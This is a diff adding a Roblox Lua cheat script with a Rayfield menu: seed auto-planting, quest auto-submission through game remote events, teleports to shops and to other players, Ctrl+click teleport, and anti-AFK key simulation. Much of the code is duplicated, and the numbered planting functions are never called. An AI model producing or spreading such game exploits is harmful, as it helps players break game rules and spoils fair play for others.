+			part15.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+		end
+	end
+end
+
+APTab:CreateToggle({
+    Name = "Auto Plant Mango Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Mango", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+-- part16
+local function startseedplacing16(seedname, value)
+	local locked = false 
+	local car = mouse.Button1Down:Connect(function()
+		if not locked then
+			locked = true
+			car:Disconnect()
+		end
+	end)
+
+	if value then
+		part16 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+		part16.Size = Vector3.new(0.8, 1.65, 0.8)
+		part16.Anchored = true
+		part16.CanCollide = false
+		part16.Position = Vector3.new(0, 5, 0)
+		part16.Transparency = 0.5
+		part16.Parent = workspace
+	end
+
+	if not value and part16 then
+		part16:Destroy()
+	end
+
+	local rotation = 0
+	while value do
+		task.wait()
+		HoldItem(seedname)
+		local pos = part16.Position
+		rotation = rotation + math.rad(1)
+		if rotation > math.pi * 2 then rotation = 0 end
+
+		if not locked then
+			mousePos = mouse.Hit.Position
+			part16.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+		else
+			currentPos = part16.Position
+			part16.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+		end
+	end
+end
+
+APTab:CreateToggle({
+    Name = "Auto Plant Grape Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Grape", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+-- part17
+local function startseedplacing17(seedname, value)
+	local locked = false 
+	local car = mouse.Button1Down:Connect(function()
+		if not locked then
+			locked = true
+			car:Disconnect()
+		end
+	end)
+
+	if value then
+		part17 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+		part17.Size = Vector3.new(0.8, 1.65, 0.8)
+		part17.Anchored = true
+		part17.CanCollide = false
+		part17.Position = Vector3.new(0, 5, 0)
+		part17.Transparency = 0.5
+		part17.Parent = workspace
+	end
+
+	if not value and part17 then
+		part17:Destroy()
+	end
+
+	local rotation = 0
+	while value do
+		task.wait()
+		HoldItem(seedname)
+		local pos = part17.Position
+		rotation = rotation + math.rad(1)
+		if rotation > math.pi * 2 then rotation = 0 end
+
+		if not locked then
+			mousePos = mouse.Hit.Position
+			part17.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+		else
+			currentPos = part17.Position
+			part17.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+		end
+	end
+end
+
+APTab:CreateToggle({
+    Name = "Auto Plant Mushroom Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Mushroom", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+-- part18
+local function startseedplacing18(seedname, value)
+	local locked = false 
+	local car = mouse.Button1Down:Connect(function()
+		if not locked then
+			locked = true
+			car:Disconnect()
+		end
+	end)
+
+	if value then
+		part18 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+		part18.Size = Vector3.new(0.8, 1.65, 0.8)
+		part18.Anchored = true
+		part18.CanCollide = false
+		part18.Position = Vector3.new(0, 5, 0)
+		part18.Transparency = 0.5
+		part18.Parent = workspace
+	end
+
+	if not value and part18 then
+		part18:Destroy()
+	end
+
+	local rotation = 0
+	while value do
+		task.wait()
+		HoldItem(seedname)
+		local pos = part18.Position
+		rotation = rotation + math.rad(1)
+		if rotation > math.pi * 2 then rotation = 0 end
+
+		if not locked then
+			mousePos = mouse.Hit.Position
+			part18.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+		else
+			currentPos = part18.Position
+			part18.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+		end
+	end
+end
+
+APTab:CreateToggle({
+    Name = "Auto Plant Pepper Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Pepper", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+-- part19
+local function startseedplacing19(seedname, value)
+	local locked = false 
+	local car = mouse.Button1Down:Connect(function()
+		if not locked then
+			locked = true
+			car:Disconnect()
+		end
+	end)
+
+	if value then
+		part19 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+		part19.Size = Vector3.new(0.8, 1.65, 0.8)
+		part19.Anchored = true
+		part19.CanCollide = false
+		part19.Position = Vector3.new(0, 5, 0)
+		part19.Transparency = 0.5
+		part19.Parent = workspace
+	end
+
+	if not value and part19 then
+		part19:Destroy()
+	end
+
+	local rotation = 0
+	while value do
+		task.wait()
+		HoldItem(seedname)
+		local pos = part19.Position
+		rotation = rotation + math.rad(1)
+		if rotation > math.pi * 2 then rotation = 0 end
+
+		if not locked then
+			mousePos = mouse.Hit.Position
+			part19.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+		else
+			currentPos = part19.Position
+			part19.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+		end
+	end
+end
+
+APTab:CreateToggle({
+    Name = "Auto Plant Cacao Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Cacao", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+-- part20
+local function startseedplacing20(seedname, value)
+	local locked = false 
+	local car = mouse.Button1Down:Connect(function()
+		if not locked then
+			locked = true
+			car:Disconnect()
+		end
+	end)
+
+	if value then
+		part20 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
+		part20.Size = Vector3.new(0.8, 1.65, 0.8)
+		part20.Anchored = true
+		part20.CanCollide = false
+		part20.Position = Vector3.new(0, 5, 0)
+		part20.Transparency = 0.5
+		part20.Parent = workspace
+	end
+
+	if not value and part20 then
+		part20:Destroy()
+	end
+
+	local rotation = 0
+	while value do
+		task.wait()
+		HoldItem(seedname)
+		local pos = part20.Position
+		rotation = rotation + math.rad(1)
+		if rotation > math.pi * 2 then rotation = 0 end
+
+		if not locked then
+			mousePos = mouse.Hit.Position
+			part20.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
+		else
+			currentPos = part20.Position
+			part20.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
+		end
+	end
+end
+
+APTab:CreateToggle({
+    Name = "Auto Plant Beanstalk Seed",
+    CurrentValue = false,
+    Flag = "AutoPlantCarrot",
+    Callback = function(Value)
+        AutoPlantEnabled = Value
+
+
+        if Value then
+            PlantingThread = task.spawn(function()
+                    startseedplacing("Beanstalk", true)
+
+            end)
+        else
+            AutoPlantEnabled = false
+            if PlantingThread then
+                startseedplacing("", false)
+                task.cancel(PlantingThread)
+            end
+        end
+    end
+})
+
+
+
+
+
+local AQTab = Window:CreateTab("Quest", 4483362458)
+
+
+
+
+local Toggle = AQTab:CreateToggle({
+    Name = "Daily Quest UI",
+    CurrentValue = false,
+    Flag = "DailyQuestToggle",
+    Callback = function(Value)
+        local player = game:GetService("Players").LocalPlayer
+        local dailyQuestGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("DailyQuests_UI")
+
+        if dailyQuestGui then
+            dailyQuestGui.Enabled = Value
+        else
+            warn("DailyQuests_UI not found.")
+        end
+    end,
+})
+
+
+AQTab:CreateButton({
+    Name = "Submit Held Plant",
+    Callback = function()
+        local success, err = pcall(function()
+            game:GetService("ReplicatedStorage").GameEvents.NightQuestRemoteEvent:FireServer("SubmitHeldPlant")
+        end)
+
+        if success then
+            print("Submitted held plant!")
+        else
+            warn("Submission failed:", err)
+        end
+    end,
+})
+
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+local autoSubmitActive = false
+
+AQTab:CreateToggle({
+    Name = "Auto Submit Quest Plants",
+    CurrentValue = false,
+    Callback = function(Value)
+        autoSubmitActive = Value
+        print("Auto Submit is now", autoSubmitActive and "Enabled" or "Disabled")
+
+        task.spawn(function()
+            while autoSubmitActive do
+                local character = LocalPlayer.Character
+                local backpack = LocalPlayer.Backpack
+
+                -- Check if backpack has any moonlit/bloodlit plants
+                local foundTool = nil
+                for _, tool in ipairs(backpack:GetChildren()) do
+                    if tool:IsA("Tool") and (tool.Name:lower():find("moonlit") or tool.Name:lower():find("bloodlit")) then
+                        foundTool = tool
+                        break
+                    end
+                end
+
+                if foundTool then
+                    local heldTool = character:FindFirstChildOfClass("Tool")
+                    local isCorrectToolEquipped = heldTool and (heldTool.Name:lower():find("moonlit") or heldTool.Name:lower():find("bloodlit"))
+
+                    if not isCorrectToolEquipped then
+                        foundTool.Parent = character -- Equip it
+                    else
+                        local success, err = pcall(function()
+                            ReplicatedStorage.GameEvents.NightQuestRemoteEvent:FireServer("SubmitHeldPlant")
+                        end)
+
+                        if success then
+                            print("Submitted held plant:", heldTool.Name)
+                        else
+                            warn("Submission failed:", err)
+                        end
+                    end
+                else
+                    print("No Moonlit or Bloodlit plants in backpack. Pausing auto-submission...")
+                end
+
+                task.wait(1.5)
+            end
+        end)
+    end,
+})
+
+
+
+
+-- YayYay Woobeeeee 
+
+TPTab = Window:CreateTab("Teleports", 4483362458)
+
+ MyLabel = TPTab:CreateLabel("Area Tps")
+
+TPTab:CreateButton({
+    Name = "Teleport to Event Circle",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local hrp = character:WaitForChild("HumanoidRootPart")
+
+        -- Teleport to specific coordinates
+        hrp.CFrame = CFrame.new(-100.13, 4.28, -9.10)
+    end,
+})
+
+-- Teleport to Egg Shop
+TPTab:CreateButton({
+    Name = "Teleport to Egg Shop",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-257.42, 3.00, -3.94))
+        end
+    end,
+})
+
+
+TPTab:CreateButton({
+    Name = "Teleport to Gear Shop",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-262.87, 3.00, -31.23))
+        end
+    end,
+})
+
+
+
+ Players = game:GetService("Players")
+ LocalPlayer = Players.LocalPlayer
+
+
+ function GetPlayerList()
+    local list = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            table.insert(list, player.Name)
+        end
+    end
+    return list
+end
+
+
+ selectedPlayer = nil
+ teleportEnabled = false
+
+
+ Players = game:GetService("Players")
+ LocalPlayer = Players.LocalPlayer
+
+
+function GetPlayerList()
+    local list = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            table.insert(list, player.Name)
+        end
+    end
+    return list
+end
+
+
+ selectedPlayer = nil
+ teleportEnabled = false
+
+
+PlayerDropdown = TPTab:CreateDropdown({
+    Name = "Teleport To Player",
+    Options = GetPlayerList(),
+    CurrentOption = nil,
+    Callback = function(Option)
+        
+        if typeof(Option) == "table" then
+            selectedPlayer = Option[1]
+        else
+            selectedPlayer = Option
+        end
+    end,
+})
+
+
+TPTab:CreateToggle({
+    Name = "Enable Teleport",
+    CurrentValue = false,
+    Callback = function(Value)
+        teleportEnabled = Value
+
+        if teleportEnabled and selectedPlayer then
+            local Target = Players:FindFirstChild(selectedPlayer)
+            if Target and Target.Character and Target.Character:FindFirstChild("Head") then
+                LocalPlayer.Character:MoveTo(Target.Character.Head.Position)
+            end
+        end
+    end,
+})
+
+
+function UpdateDropdown()
+    PlayerDropdown:SetOptions(GetPlayerList())
+end
+
+Players.PlayerAdded:Connect(UpdateDropdown)
+Players.PlayerRemoving:Connect(UpdateDropdown)
+
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+
+local isCtrlHeld = false
+
+-- Detect when Ctrl is pressed or released
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if input.KeyCode == Enum.KeyCode.LeftControl then
+		isCtrlHeld = true
+	end
+end)
+
+UserInputService.InputEnded:Connect(function(input, gameProcessed)
+	if input.KeyCode == Enum.KeyCode.LeftControl then
+		isCtrlHeld = false
+	end
+end)
+
+-- Teleport on Ctrl + Left Click
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+
+	if input.UserInputType == Enum.UserInputType.MouseButton1 and isCtrlHeld then
+		local character = LocalPlayer.Character
+		if character and character:FindFirstChild("HumanoidRootPart") then
+			local targetPosition = Mouse.Hit.Position
+			targetPosition = Vector3.new(targetPosition.X, targetPosition.Y + 3, targetPosition.Z)
+			character:MoveTo(targetPosition)
+		end
+	end
+end)
+
+local MyLabel = TPTab:CreateLabel("Hold Ctrl + Click TP")
+
+local CredTab = Window:CreateTab("WebHook", 4483362458)
+
+local SetTab = Window:CreateTab("Settings", 4483362458)
+
+
+local Players = game:GetService("Players")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local LocalPlayer = Players.LocalPlayer
+
+local ConnectionAntiAfk -- defined outside to track connection
+
+function AntiAfk(state)
+    if state then
+        ConnectionAntiAfk = LocalPlayer.Idled:Connect(function()
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
+            task.wait(0.1)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
+            print("Prevented Idling")
+        end)
+    elseif ConnectionAntiAfk then
+        ConnectionAntiAfk:Disconnect()
+        ConnectionAntiAfk = nil
+    end
+end
+
+-- Initial call so it's active on script load
+AntiAfk(true)
+
+-- Rayfield Toggle in SetTab
+SetTab:CreateToggle({
+    Name = "Anti-AFK",
+    CurrentValue = true,
+    Flag = "AntiAfkToggle",
+    Callback = function(state)
+        AntiAfk(state)
+    end
+})
+
+
+CredTab = Window:CreateTab("Credits", 4483362458)
+
+MyLabel = CredTab:CreateLabel("Script Owners - WooBeee#0655, CatCat6869")
+
+
+
+applyautofarm()
+
+
+ CoreGui = game:GetService("CoreGui")
+ HiddenUI = CoreGui:FindFirstChild("HiddenUI")
+
+if HiddenUI then
+    for _, child in ipairs(HiddenUI:GetChildren()) do
+        if child:IsA("ScreenGui") and string.find(child.Name, "Rayfield") then
+            pcall(function()
+                child:Destroy()
+            end)
+        end
+    end
+end
